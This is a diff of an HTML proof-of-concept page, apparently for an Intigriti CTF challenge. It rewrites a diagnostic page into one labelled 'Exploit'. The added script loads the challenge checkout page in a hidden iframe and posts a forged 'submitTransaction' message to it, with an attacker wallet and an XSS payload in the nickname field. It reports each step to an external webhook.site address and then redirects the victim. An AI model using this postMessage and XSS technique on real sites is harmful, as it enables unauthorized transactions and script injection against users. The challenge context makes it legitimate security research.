@@ -1,53 +1,65 @@
 <!DOCTYPE html>
-<html><head><title>Diagnostic</title></head>
+<html><head><title>Dynamic Iframe</title></head>
 <body>
-<h2>Step by Step Test</h2>
+<h2>Exploit</h2>
 <pre id=log></pre>
-<iframe id=x src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:300px"></iframe>
 <script>
 const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
+const WALLET = '16472226db03703a192aa383237035a69f';
 const log = document.getElementById('log');
-let step = 0;
 
-function report(stepName, data) {
-    step++;
-    const msg = `[Step ${step}] ${stepName}`;
-    log.textContent += '\n' + msg;
-    console.log(msg);
-    
-    fetch(WEBHOOK + '?step=' + step + '&name=' + stepName + '&data=' + btoa(JSON.stringify(data || {})))
-        .catch(() => new Image().src = WEBHOOK + '?step=' + step + '&name=' + stepName);
+function report(step, data) {
+    log.textContent += '\n' + step;
+    fetch(WEBHOOK + '?s=' + step + '&d=' + btoa(JSON.stringify(data||{}))).catch(()=>{});
 }
 
-// Step 1: Page loaded
-report('PAGE_LOADED', {ua: navigator.userAgent});
+// Page loaded - report first
+report('1_PAGE_LOADED', {});
 
-// Step 2: Iframe exists
-report('IFRAME_TAG_EXISTS', {src: document.getElementById('x').src});
-
-// Step 3: Iframe load event
-document.getElementById('x').onload = function() {
-    report('IFRAME_ONLOAD_FIRED', {});
+// After delay, create iframe dynamically
+setTimeout(function() {
+    report('2_CREATING_IFRAME', {});
     
-    // Step 4: Try to access contentWindow
-    setTimeout(function() {
-        try {
-            const cw = document.getElementById('x').contentWindow;
-            report('CONTENT_WINDOW_ACCESSIBLE', {hasWindow: !!cw});
-            
-            // Step 5: Try postMessage
-            cw.postMessage({test: 'hello'}, '*');
-            report('POSTMESSAGE_SENT', {});
-            
-        } catch(e) {
-            report('CONTENT_WINDOW_ERROR', {error: e.message});
-        }
-    }, 1000);
-};
-
-document.getElementById('x').onerror = function() {
-    report('IFRAME_ONERROR', {});
-};
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    
+    report('3_IFRAME_ADDED', {});
+    
+    iframe.onload = function() {
+        report('4_IFRAME_LOADED', {});
+        
+        setTimeout(function() {
+            try {
+                iframe.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: WALLET,
+                        currency: '1337COIN',
+                        amount: 1,
+                        nickname: '<img src=x onerror="alert(\'gigawatz\')">'
+                    }
+                }, '*');
+                
+                report('5_POSTMESSAGE_SENT', {});
+                
+                setTimeout(function() {
+                    report('6_REDIRECTING', {});
+                    window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
+                }, 2000);
+                
+            } catch(e) {
+                report('5_ERROR', {msg: e.message});
+            }
+        }, 2000);
+    };
+    
+    iframe.onerror = function() {
+        report('4_IFRAME_ERROR', {});
+    };
+    
+}, 1000);
 </script>
 </body>
 </html>
